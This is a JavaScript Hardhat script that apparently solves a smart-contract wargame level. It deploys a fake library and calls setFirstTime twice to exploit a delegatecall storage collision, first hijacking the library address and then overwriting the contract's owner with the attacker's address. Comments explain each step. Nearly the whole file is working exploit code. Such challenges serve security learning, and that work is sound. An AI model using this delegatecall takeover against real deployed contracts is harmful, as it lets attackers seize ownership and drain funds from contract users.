const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xE32813c40F6E57fdF855C4a7C49d8990bb06287a'
const abi = [
    "function setFirstTime(uint _timeStamp) public",
    "function timeZone1Library() public view returns (address)",
    "function owner() public view returns (address)"
]

async function hack(contract, signer) {
    const FakeTimeZoneLibrary = await ethers.getContractFactory("FakeTimeZoneLibrary");
    const fakeTimeZoneLibrary = await FakeTimeZoneLibrary.deploy();
    await fakeTimeZoneLibrary.deployed();
    console.log("FakeTimeZoneLibrary Deployed To:", fakeTimeZoneLibrary.address);

    // Delegatecall acts on local storage.
    // Instead of updating its storedTime variable, it updates our timeZone1Library address.
    const hijackLibraryTx = await contract.setFirstTime(BigNumber.from(fakeTimeZoneLibrary.address));
    await hijackLibraryTx.wait();
    const timeZone1Library = await contract.timeZone1Library();
    console.log("New TimeZone1Library:", timeZone1Library);

    // Our fake library matches the function definition, but adjusts Slot 2 instead of Slot 0.
    // We call it again, but this time adjust it to our address instead of the fake contract.
    const hijackOwnerTx = await contract.setFirstTime(BigNumber.from(signer.address), {gasLimit: 2000000});
    await hijackOwnerTx.wait();
    const owner = await contract.owner();
    console.log("New Owner:", owner);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})